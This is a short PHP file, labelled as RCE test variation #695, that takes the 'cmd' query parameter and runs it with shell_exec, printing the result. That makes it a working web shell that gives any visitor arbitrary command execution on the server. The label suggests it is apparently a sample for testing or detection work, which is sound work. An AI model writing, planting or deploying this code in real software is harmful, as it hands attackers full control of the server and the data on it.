<?php
// RCE test variation #695
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>